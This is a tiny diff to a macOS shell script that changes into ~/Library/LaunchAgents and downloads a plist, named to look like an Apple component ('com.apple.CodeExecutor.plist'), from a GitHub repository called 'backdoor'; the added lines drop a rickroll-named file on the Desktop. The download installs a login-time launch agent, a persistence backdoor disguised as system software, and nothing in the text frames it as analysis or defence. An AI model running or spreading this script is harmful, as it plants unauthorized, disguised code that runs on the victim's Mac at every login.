@@ -1,2 +1,4 @@
 cd ~/Library/LaunchAgents/
 curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/com.apple.CodeExecutor.plist"
+cd ~/Desktop
+touch "never gonna give you up"
